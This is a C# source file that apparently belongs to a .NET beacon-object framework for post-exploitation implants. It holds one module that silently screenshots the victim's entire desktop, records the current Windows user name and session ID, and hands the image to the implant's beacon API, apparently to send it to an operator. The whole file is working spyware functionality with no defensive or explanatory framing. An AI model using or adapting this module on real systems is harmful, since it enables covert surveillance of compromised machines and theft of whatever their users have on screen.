using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Security.Principal;
using System.Windows.Forms;

namespace BOFNET.Bofs {
    public class Screenshot : BeaconObject {
        public Screenshot(BeaconApi api) : base(api) {
        }

        public override void Go(string[] _) {

            var imageStream = new MemoryStream();

            int screenLeft = SystemInformation.VirtualScreen.Left;
            int screenTop = SystemInformation.VirtualScreen.Top;
            int screenWidth = SystemInformation.VirtualScreen.Width;
            int screenHeight = SystemInformation.VirtualScreen.Height;

            using (Bitmap bmpScreenCapture = new Bitmap(screenWidth, screenHeight)) {

                using (Graphics g = Graphics.FromImage(bmpScreenCapture)) {
                    g.CopyFromScreen(screenLeft, screenTop, 0, 0,
                                     bmpScreenCapture.Size,
                                     CopyPixelOperation.SourceCopy);
                }

                bmpScreenCapture.Save(imageStream, ImageFormat.Jpeg);
            }

            byte[] jpgData = imageStream.ToArray();
            SendScreenShot(jpgData, Process.GetCurrentProcess().SessionId, WindowsIdentity.GetCurrent().Name, "Desktop");
        }
    }
}
